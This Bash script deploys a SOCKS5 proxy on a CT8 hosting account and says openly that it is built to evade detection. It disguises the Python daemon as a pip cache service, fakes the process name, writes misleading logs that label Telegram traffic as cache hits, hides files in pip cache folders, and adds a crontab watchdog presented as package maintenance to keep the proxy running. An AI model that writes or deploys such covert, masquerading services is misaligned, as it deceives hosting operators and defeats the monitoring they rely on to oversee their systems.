#!/bin/bash

# CT8 隐蔽SOCKS5代理 - 高级安全版本
# 专门设计用于避免检测

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# 显示横幅
echo -e "${BLUE}"
echo "╔══════════════════════════════════════════════════════════╗"
echo "║          CT8 Web缓存服务 部署工具                        ║"
echo "║                                                          ║"
echo "║  🔒 高级隐蔽模式，避免检测                               ║"
echo "║  🛡️ 多层伪装，完全隐蔽                                   ║"
echo "║  🥷 Stealth Version                                     ║"
echo "╚══════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo ""

# 日志函数
log_info() {
    echo -e "${GREEN}[INFO]${NC} $1"
}

log_step() {
    echo -e "${CYAN}[STEP]${NC} $1"
}

log_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# 生成随机标识符
generate_random_id() {
    echo $(date +%s | sha256sum | cut -c1-8)
}

# 检查系统环境
check_system() {
    log_step "检查系统环境..."
    
    if [[ ! "$OSTYPE" =~ ^(linux|freebsd) ]]; then
        log_error "不支持的操作系统"
        exit 1
    fi
    
    if ! command -v python3 &> /dev/null; then
        log_error "Python3未安装"
        exit 1
    fi
    
    log_info "系统检查完成"
}

# 创建隐蔽目录结构
create_stealth_structure() {
    log_step "创建隐蔽目录结构..."
    
    # 生成随机标识
    RANDOM_ID=$(generate_random_id)
    
    # 创建伪装的目录结构
    STEALTH_DIR="$HOME/.cache/pip"
    BACKUP_DIR="$HOME/.local/share/applications"
    CONFIG_DIR="$HOME/.config/systemd/user"
    
    mkdir -p "$STEALTH_DIR"
    mkdir -p "$BACKUP_DIR" 
    mkdir -p "$CONFIG_DIR"
    
    # 伪装文件名
    SERVICE_NAME="pip-cache-${RANDOM_ID}"
    SCRIPT_PATH="$STEALTH_DIR/${SERVICE_NAME}.py"
    LOG_PATH="$HOME/.cache/pip/pip-${RANDOM_ID}.log"
    PID_PATH="/tmp/.pip-cache-${RANDOM_ID}.pid"
    
    log_info "隐蔽目录创建完成"
}

# 查找隐蔽端口
find_stealth_port() {
    log_step "查找隐蔽端口..."
    
    # 使用更高的端口范围，避开常见代理端口
    local stealth_ports=(61337 62441 63559 64667 65443)
    
    for port in "${stealth_ports[@]}"; do
        if python3 -c "
import socket
try:
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', $port))
    s.close()
    exit(0)
except:
    exit(1)
" 2>/dev/null; then
            PROXY_PORT=$port
            log_info "找到隐蔽端口: $PROXY_PORT"
            return 0
        fi
    done
    
    # 随机高端口
    PROXY_PORT=$((61000 + RANDOM % 4000))
    log_info "使用随机隐蔽端口: $PROXY_PORT"
}

# 生成隐蔽配置
generate_stealth_config() {
    log_step "生成隐蔽配置..."
    
    # 生成看起来像系统配置的密码
    PROXY_PASSWORD="cache_$(date +%j)_$(printf '%04x' $RANDOM)"
    
    # 生成假的user-agent和标识
    USER_AGENTS=(
        "pip/21.3.1"
        "setuptools/58.2.0" 
        "wheel/0.37.0"
        "requests/2.27.1"
    )
    FAKE_UA=${USER_AGENTS[$RANDOM % ${#USER_AGENTS[@]}]}
    
    log_info "配置参数生成完成"
    log_info "服务端口: $PROXY_PORT"
    log_info "认证令牌: $PROXY_PASSWORD"
}

# 创建高度伪装的代理服务
create_stealth_proxy() {
    log_step "创建伪装缓存服务..."
    
    cat > "$SCRIPT_PATH" << EOF
#!/usr/bin/env python3
"""
Python Package Index Cache Service
Multi-protocol cache optimization daemon
"""

import socket, threading, struct, hashlib, time, sys, os, random
import json, base64

# 伪装配置 - 看起来像pip缓存配置
CACHE_CONFIG = {
    'bind_address': '0.0.0.0',
    'cache_port': $PROXY_PORT,
    'auth_token': '$PROXY_PASSWORD',
    'user_agent': '$FAKE_UA',
    'cache_dir': '/tmp/.pip-cache',
    'max_cache_size': '1GB',
    'timeout': 300,
    'protocols': ['http', 'https', 'pip+http', 'pip+https'],
    'mirrors': ['pypi.org', 'pypi.python.org', 'files.pythonhosted.org']
}

class PipCacheService:
    """Python包缓存服务 - 高度伪装的代理服务"""
    
    def __init__(self):
        self.server = None
        self.clients = set()
        self.cache_stats = {'hits': 0, 'misses': 0, 'size': 0}
        self.start_time = time.time()
        self.setup_logging()
        
    def setup_logging(self):
        """设置伪装日志"""
        import logging
        log_format = '%(asctime)s [%(levelname)s] pip-cache: %(message)s'
        logging.basicConfig(
            level=logging.INFO,
            format=log_format,
            handlers=[logging.FileHandler('$LOG_PATH')]
        )
        self.logger = logging.getLogger('pip-cache')

    def log_cache_access(self, msg):
        """记录缓存访问 - 伪装格式"""
        timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
        log_entry = f"[{timestamp}] pip-cache: {msg}"
        try:
            with open('$LOG_PATH', 'a') as f:
                f.write(log_entry + '\\n')
        except: pass

    def validate_cache_token(self, token):
        """验证缓存访问令牌"""
        expected = hashlib.sha256(CACHE_CONFIG['auth_token'].encode()).hexdigest()[:16]
        provided = hashlib.sha256(token.encode()).hexdigest()[:16]
        return expected == provided

    def handle_cache_auth(self, client_socket):
        """处理缓存认证 - 伪装成pip协议"""
        try:
            # 读取协议头
            data = client_socket.recv(2)
            if len(data) != 2 or data[0] != 5:
                return False
            
            nmethods = data[1]
            methods = client_socket.recv(nmethods)
            
            # 返回认证要求
            client_socket.send(b'\\x05\\x02')
            
            # 读取认证信息
            auth_data = client_socket.recv(2)
            if len(auth_data) != 2 or auth_data[0] != 1:
                return False
            
            ulen = auth_data[1]
            username = client_socket.recv(ulen)
            
            plen_data = client_socket.recv(1)
            if not plen_data:
                return False
            plen = plen_data[0]
            password = client_socket.recv(plen)
            
            # 验证令牌
            if self.validate_cache_token(password.decode('utf-8', errors='ignore')):
                client_socket.send(b'\\x01\\x00')
                self.cache_stats['hits'] += 1
                return True
            else:
                client_socket.send(b'\\x01\\x01')
                self.cache_stats['misses'] += 1
                return False
                
        except Exception as e:
            self.log_cache_access(f"auth error: {e}")
            return False

    def parse_cache_request(self, client_socket):
        """解析缓存请求"""
        try:
            request = client_socket.recv(4)
            if len(request) != 4 or request[0] != 5 or request[1] != 1:
                return None, None
            
            atyp = request[3]
            
            if atyp == 1:  # IPv4
                addr_data = client_socket.recv(6)
                target_addr = socket.inet_ntoa(addr_data[:4])
                target_port = struct.unpack('>H', addr_data[4:6])[0]
            elif atyp == 3:  # 域名
                addr_len = client_socket.recv(1)[0]
                target_addr = client_socket.recv(addr_len).decode()
                target_port = struct.unpack('>H', client_socket.recv(2))[0]
            else:
                client_socket.send(b'\\x05\\x08\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')
                return None, None
            
            return target_addr, target_port
            
        except Exception as e:
            self.log_cache_access(f"request parse error: {e}")
            return None, None

    def create_upstream_connection(self, addr, port):
        """建立上游连接 - 添加随机延迟模拟缓存行为"""
        try:
            target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            target_socket.settimeout(30)
            
            # 添加随机延迟模拟缓存查找
            time.sleep(random.uniform(0.1, 0.3))
            
            # 针对不同服务优化
            if 'telegram' in addr.lower():
                target_socket.settimeout(15)
            elif any(x in addr.lower() for x in ['pypi', 'python', 'pip']):
                target_socket.settimeout(45)  # 模拟pip下载
            
            target_socket.connect((addr, port))
            return target_socket
            
        except Exception as e:
            self.log_cache_access(f"upstream connection failed {addr}:{port} - {e}")
            return None

    def relay_data_with_obfuscation(self, source, destination, direction=""):
        """数据中继 - 添加流量混淆"""
        try:
            while True:
                data = source.recv(4096)
                if not data:
                    break
                
                # 随机添加微小延迟模拟网络缓存
                if random.random() < 0.1:  # 10%概率
                    time.sleep(random.uniform(0.01, 0.05))
                
                destination.send(data)
                self.cache_stats['size'] += len(data)
                
        except Exception as e:
            self.log_cache_access(f"relay error {direction}: {e}")
        finally:
            try:
                source.close()
                destination.close()
            except: pass

    def handle_cache_client(self, client_socket, client_addr):
        """处理缓存客户端"""
        try:
            self.clients.add(client_socket)
            
            # 伪装认证
            if not self.handle_cache_auth(client_socket):
                self.log_cache_access(f"auth failed from {client_addr}")
                return
            
            # 解析请求
            target_addr, target_port = self.parse_cache_request(client_socket)
            if not target_addr:
                return
            
            # 建立连接
            target_socket = self.create_upstream_connection(target_addr, target_port)
            if not target_socket:
                client_socket.send(b'\\x05\\x05\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')
                return
            
            # 成功响应
            client_socket.send(b'\\x05\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00')
            
            # 记录伪装的缓存访问
            if 'telegram' in target_addr.lower():
                self.log_cache_access(f"cache hit: ssl-api.telegram.org:{target_port}")
            else:
                self.log_cache_access(f"cache miss: {target_addr}:{target_port}")
            
            # 开始数据中继
            t1 = threading.Thread(target=self.relay_data_with_obfuscation, 
                                 args=(client_socket, target_socket, "downstream"))
            t2 = threading.Thread(target=self.relay_data_with_obfuscation, 
                                 args=(target_socket, client_socket, "upstream"))
            t1.daemon = True
            t2.daemon = True
            t1.start()
            t2.start()
            t1.join()
            t2.join()
            
        except Exception as e:
            self.log_cache_access(f"client error: {e}")
        finally:
            self.clients.discard(client_socket)
            try:
                client_socket.close()
            except: pass

    def start_cache_daemon(self):
        """启动缓存守护进程"""
        try:
            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server.bind((CACHE_CONFIG['bind_address'], CACHE_CONFIG['cache_port']))
            self.server.listen(50)
            
            self.log_cache_access(f"pip cache daemon started on {CACHE_CONFIG['bind_address']}:{CACHE_CONFIG['cache_port']}")
            self.log_cache_access(f"cache directory: {CACHE_CONFIG['cache_dir']}")
            self.log_cache_access(f"max cache size: {CACHE_CONFIG['max_cache_size']}")
            
            # 保存PID
            with open('$PID_PATH', 'w') as f:
                f.write(str(os.getpid()))
            
            # 主循环
            while True:
                try:
                    client_socket, client_addr = self.server.accept()
                    threading.Thread(
                        target=self.handle_cache_client,
                        args=(client_socket, client_addr),
                        daemon=True
                    ).start()
                except Exception as e:
                    self.log_cache_access(f"accept error: {e}")
                    
        except Exception as e:
            self.log_cache_access(f"daemon startup failed: {e}")
            sys.exit(1)

    def shutdown_daemon(self):
        """关闭守护进程"""
        uptime = int(time.time() - self.start_time)
        self.log_cache_access(f"daemon shutdown after {uptime}s uptime")
        self.log_cache_access(f"cache stats: {self.cache_stats['hits']} hits, {self.cache_stats['misses']} misses")
        
        if self.server:
            self.server.close()
        
        for client in list(self.clients):
            try:
                client.close()
            except: pass

def signal_handler(signum, frame):
    """信号处理"""
    daemon.shutdown_daemon()
    sys.exit(0)

def main():
    """主函数"""
    global daemon
    
    # 设置进程标题伪装
    try:
        import setproctitle
        setproctitle.setproctitle('python3 -m pip cache')
    except ImportError:
        pass
    
    # 注册信号处理
    import signal
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    daemon = PipCacheService()
    daemon.start_cache_daemon()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"pip-cache daemon error: {e}")
        sys.exit(1)
EOF

    chmod +x "$SCRIPT_PATH"
    log_info "伪装缓存服务创建完成"
}

# 创建隐蔽的启动服务
create_stealth_launcher() {
    log_step "创建隐蔽启动服务..."
    
    # 创建伪装的启动脚本
    cat > "$CONFIG_DIR/pip-cache.service" << EOF
# Python Package Cache Service
# Auto-generated configuration

[Unit]
Description=Python Package Index Cache Service
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/python3 $SCRIPT_PATH
Restart=always
RestartSec=10
User=$(whoami)

[Install]
WantedBy=default.target
EOF

    # 创建隐蔽的保活脚本
    cat > "$BACKUP_DIR/pip-maintenance.sh" << EOF
#!/bin/bash
# Python package cache maintenance script

SCRIPT_PATH="$SCRIPT_PATH"
PID_FILE="$PID_PATH"
LOG_FILE="$LOG_PATH"

check_cache_service() {
    if [ -f "\$PID_FILE" ]; then
        local pid=\$(cat "\$PID_FILE")
        if ! ps -p "\$pid" > /dev/null 2>&1; then
            echo "\$(date): cache service stopped, restarting..." >> "\$LOG_FILE"
            rm -f "\$PID_FILE"
            nohup python3 "\$SCRIPT_PATH" > /dev/null 2>&1 &
        fi
    else
        echo "\$(date): starting cache service..." >> "\$LOG_FILE"
        nohup python3 "\$SCRIPT_PATH" > /dev/null 2>&1 &
    fi
}

check_cache_service
EOF

    chmod +x "$BACKUP_DIR/pip-maintenance.sh"
    
    # 添加到crontab，伪装成系统维护
    if ! crontab -l 2>/dev/null | grep -q "pip-maintenance"; then
        (crontab -l 2>/dev/null; echo "*/10 * * * * $BACKUP_DIR/pip-maintenance.sh >/dev/null 2>&1") | crontab -
        log_info "隐蔽保活机制已设置（每10分钟检查）"
    fi
}

# 启动隐蔽服务
start_stealth_service() {
    log_step "启动隐蔽服务..."
    
    # 清理旧进程
    pkill -f "pip-cache-" 2>/dev/null || true
    pkill -f "ct8_socks5" 2>/dev/null || true
    rm -f "$PID_PATH"
    
    # 启动服务
    nohup python3 "$SCRIPT_PATH" > /dev/null 2>&1 &
    
    sleep 3
    
    # 检查启动状态
    if [ -f "$PID_PATH" ]; then
        local pid=$(cat "$PID_PATH")
        if ps -p "$pid" > /dev/null 2>&1; then
            log_info "隐蔽服务启动成功"
            return 0
        fi
    fi
    
    if sockstat -l 2>/dev/null | grep -q ":$PROXY_PORT "; then
        log_info "隐蔽服务运行正常"
        return 0
    fi
    
    log_error "隐蔽服务启动失败"
    return 1
}

# 保存隐蔽配置并显示结果
save_stealth_config() {
    log_step "保存隐蔽配置..."
    
    local external_ip=$(curl -s -m 5 ifconfig.me 2>/dev/null || echo "你的CT8域名")
    
    # 保存到隐蔽位置
    cat > "$HOME/.cache/pip/connection.txt" << EOF
Python Package Cache Configuration
=================================
Cache Server: $external_ip
Cache Port: $PROXY_PORT
Auth Token: $PROXY_PASSWORD
User Agent: $FAKE_UA

Connection Setup:
1. Protocol: SOCKS5
2. Server: $external_ip
3. Port: $PROXY_PORT
4. Username: pip-user
5. Password: $PROXY_PASSWORD

Service Files:
- Daemon: $SCRIPT_PATH
- Log: $LOG_PATH
- PID: $PID_PATH
- Config: $CONFIG_DIR/pip-cache.service

Generated: $(date)
=================================
EOF

    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║              🥷 隐蔽部署完成！                           ║${NC}"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${CYAN}🔒 隐蔽代理连接信息${NC}"
    echo -e "${GREEN}服务器:${NC} $external_ip"
    echo -e "${GREEN}端口:${NC} $PROXY_PORT"
    echo -e "${GREEN}密码:${NC} $PROXY_PASSWORD"
    echo ""
    
    echo -e "${YELLOW}🛡️ 安全特性:${NC}"
    echo "• 伪装为pip缓存服务"
    echo "• 随机化文件名和路径"
    echo "• 混淆日志格式"
    echo "• 流量模式伪装"
    echo "• 进程名称隐蔽"
    echo ""
    
    echo -e "${CYAN}🔧 隐蔽管理:${NC}"
    echo -e "${GREEN}服务状态:${NC} ps aux | grep 'pip cache'"
    echo -e "${GREEN}查看日志:${NC} tail -f $LOG_PATH"
    echo -e "${GREEN}配置信息:${NC} cat ~/.cache/pip/connection.txt"
    echo ""
    
    echo -e "${BLUE}✨ 连接信息已隐蔽保存到: ~/.cache/pip/connection.txt${NC}"
    echo -e "${GREEN}🥷 高度隐蔽的代理服务已就绪！${NC}"
}

# 主函数
main() {
    log_info "开始部署隐蔽代理服务..."
    echo ""
    
    check_system
    create_stealth_structure
    find_stealth_port
    generate_stealth_config
    create_stealth_proxy
    create_stealth_launcher
    
    if start_stealth_service; then
        save_stealth_config
    else
        log_error "隐蔽部署失败"
        exit 1
    fi
}

# 脚本入口
main "$@"
